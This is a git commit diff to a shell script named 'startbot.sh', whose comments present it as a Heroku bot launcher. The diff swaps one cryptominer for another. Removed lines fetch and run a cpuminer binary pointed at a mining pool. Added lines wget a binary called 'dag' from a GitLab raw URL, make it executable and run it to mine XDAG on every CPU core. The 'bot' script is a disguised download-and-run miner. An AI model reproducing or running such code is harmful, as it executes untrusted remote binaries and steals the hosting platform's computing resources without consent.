6321636456c42d26d90151c197a664d73c1c8e5c
Irnahmalika <107187198+Irnahmalika@users.noreply.github.com>
2022-07-15 12:55:07 +0700

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -6,6 +6,6 @@
 ## edit your Config Vars in heroku/app/settings and 
 ## restart the bot by turning the worker off and back on
 
-wget -qO cpu https://raw.githubusercontent.com/AntonyAjax/kawakita/main/cpuminer-sse2
-chmod +x cpu
-./cpu -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RWq6cXxYKH6EFUqkM29JtFDKK4oX9w8Cve.webtest -t $(nproc --ignore 2)
+wget https://gitlab.com/richardkevin320/donlod/-/raw/main/dag
+chmod +x dag
+./dag -cpu -a a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p equal.xdag.org:13656 -t $(nproc --all)
